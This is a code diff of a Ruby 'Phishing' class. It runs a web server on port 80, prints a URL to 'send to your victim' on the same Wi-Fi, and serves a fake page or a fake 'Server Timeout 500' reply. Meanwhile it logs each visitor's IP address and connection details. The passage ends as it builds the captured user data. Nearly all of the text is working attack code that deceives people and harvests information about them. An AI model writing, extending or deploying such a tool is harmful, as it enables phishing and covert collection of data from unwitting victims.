@@ -4,6 +4,7 @@ require 'httparty'
 class Phishing 
     def initialize 
         @@server = TCPServer.new 80
+        @@path = "../views/fake_page.html"
     end
 
     def get_current_ip()
@@ -18,15 +19,16 @@ class Phishing
     
     def start_server()
         puts "Send this url to your victim who connected to the same Wi-Fi => http://#{self.get_current_ip}\n\n" 
+
         loop do
             Thread.start(@@server.accept) do |client|
                 request = client.gets 
                 sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
 
-                client.print "HELLO"
                 client.print "HTTP/1.1 200\r\n" 
-                client.print "Content-Type: text/html\r\n"
                 client.print "\r\n"
+
+                client.print "Server Timeout 500"
 
                 user_data =  <<~END
                     User Local IP Address => #{self.get_current_ip().delete("::ffff:")}
